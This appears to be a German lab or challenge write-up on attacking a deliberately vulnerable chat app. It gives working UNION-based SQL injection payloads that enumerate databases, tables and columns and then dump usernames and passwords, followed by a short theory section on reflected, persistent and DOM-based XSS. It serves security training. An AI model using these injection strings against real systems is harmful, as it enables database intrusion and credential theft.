   # WAST Challenge

## SQL Injection (Advanced)

### Angriff - Step 3

* Als erstes alle Datenbanken auslesen:

  ```sql
  a' and 1=2 UNION SELECT TABLE_SCHEMA FROM INFORMATION_SCHEMA.TABLES  -- 
  ```

  

* Dann alle Tabellen von der SQL Datenbank ausgeben:

  ```sql
  a' and 1=2 UNION SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES  as t WHERE t.TABLE_SCHEMA = 'dvwc' -- 
  ```

  * Interessante Tabellen:
    * Users
    * PoMessages
    * Chatrooms

* Als nächstes alle Spalten der Tabelle Users holen

  ```sql
  a' and 1=2 UNION SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS  as t WHERE t.TABLE_NAME = 'Users' -- 
  ```

   - Interessante Spalten:
      - id
      - surname
      - prename
      - birthday
      - username
      - pwd
      - admin
      - createdAt
      - updatedAt

 * Passwörter auslesen

   ```sql
   a' and 1=2 UNION SELECT concat(username, " " , pwd) FROM Users -- 
   ```

# XSS Session Hijacking

## Theorie XSS

Man unterscheidet drei Arten von XSS:

* **Reflektiertes XSS**

  * Hierbei wird das schädliche Skript zum Webserver gesendet, dort nicht gespeichert und ungeprüft an den Client zurückgesendet.

* **Persistentes XSS**

  * Beim persistenten (beständigen) XSS erfolgt die Speicherung der schädliche Skripte auf dem Webserver bzw. in der Datenbank. Sie werden bei jedem Aufruf an den jeweiligen Client gesandt. Für diese Art von XSS eignen sich vor allem Webanwendungen wie Foren und Blogs, welche Benutzereingaben auf dem Server speichern und ungeprüft ausgeben.

* **DOM-basiertes XSS**

  * Wird auch als lokales XSS bezeichnet. Hierbei erfolgt der Angriff über eine manipulierte URL. Der Schadcode wird clientseitig ungeprüft ausgeführt und der Webserver ist gar nicht involviert. Hierdurch sind vor allem auch statische Webseiten gefährdet und können attackiert werden.

  

